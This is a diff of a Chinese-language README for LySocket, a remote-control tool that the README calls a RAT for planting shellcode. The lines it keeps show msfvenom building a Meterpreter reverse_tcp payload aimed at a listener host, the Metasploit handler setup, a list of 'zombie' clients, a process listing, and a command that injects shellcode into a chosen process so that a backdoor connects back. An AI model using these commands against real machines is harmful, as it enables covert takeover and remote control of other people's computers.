@@ -1,4 +1,4 @@
-# LySocket 远程Shell植入远控
+# LySocket 远程ShellCode种植远控
 
 <br>
 
@@ -14,7 +14,6 @@ LySocket 是一款使用纯 `WindowsAPI` 实现的命令行版远程控制工具
 
 首先需要通过`Metasploit`工具生成一个有效载荷。
 ```
-32位载荷生成
 [root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
 ```
 后台侦听器的配置，使用时需要与载荷的位数相对应。
@@ -26,30 +25,7 @@ msf6 > set lport 9999
 msf6 exploit(multi/handler) > exploit
 ```
 
-
-
-```C
-[ LySocket ] # help
- _            ____             _        _
-| |   _   _  / ___|  ___   ___| | _____| |_
-| |  | | | | \___ \ / _ \ / __| |/ / _ \ __|
-| |__| |_| |  ___) | (_) | (__|   <  __/ |_
-|_____\__, | |____/ \___/ \___|_|\_\___|\__|
-      |___/
-
-Usage: LySocket 演示版
-Email: me@lyshark.com
-Optional:
-
-         --ShowSocket        输出所有上线客户端
-         --GetCPU            获取客户端CPU数据
-         --GetMemory         获取客户端内存数据
-         --GetProcessList    获取客户端正在运行进程列表
-         --InjectSelfCode    将ShellCode注入到客户端内
-         --InjectRemoteCode  将ShellCode注入到客户端指定进程内
-         --CloseServer       正常退出服务端
-         --Exit              退出远程客户端
-```
+ - 输出当前在线的客户端列表
 
 命令`ShowSocket`可输出当前有多少肉鸡上线了，用于确定对端IP地址，该套接字列表程序内会自动维护，如果客户端下线则Socket套接字将会被清理。
 ```C
@@ -62,30 +38,10 @@ Optional:
 2                127.0.0.1               1807            Open
 3                127.0.0.1               1808            Open
 --------------------------------------------------------------------
-[ LySocket ] #
 ```
-命令`GetCPU,GetMemory`可用于得到对点主机信息，目前只是作为演示案例使用。
-```C
-[ LySocket ] # GetCPU --address 127.0.0.1
---------------------------------------------------------------------
-CPUID: 3219913727
-CPU型号: GenuineIntel
-idle: 18281250
-kernel: 18437500
-user: 312500
-cpu: 2
---------------------------------------------------------------------
 
-[ LySocket ] # GetMemory --address 127.0.0.1
---------------------------------------------------------------------
-内存总量                 内存剩余                内存已使用
---------------------------------------------------------------------
-16219 MB                 10953 MB                5266 MB
-16219 MB                 10953 MB                5266 MB
-16219 MB                 10953 MB                5266 MB
-16219 MB                 10953 MB                5266 MB
---------------------------------------------------------------------
-```
+ - 获取客户端进程列表
+
 命令`GetProcessList`可用于得到对段主机内有哪些进程正在运行，这是注入代码的前提条件。
 ```C
 [ LySocket ] # GetProcessList --address 127.0.0.1
@@ -107,9 +63,11 @@ cpu: 2
 12               1100    x64             WUDFHost.exe
 --------------------------------------------------------------------
 ```
-得到了特定继承的PID序号以后，就可以使用如下命令注入ShellCode到特定进程内，MSF即可反弹后门链接了。
+
+ - 注入ShellCode到指定进程内
+
+使用如下命令注入ShellCode到特定进程内，MSF即可反弹后门链接了。
 ```C
 [ LySocket ] # InjectRemoteCode --address 127.0.0.1 --pid 1234 --shellcode xfec12defferciruq
 [+] Success..
-[ LySocket ] #
 ```
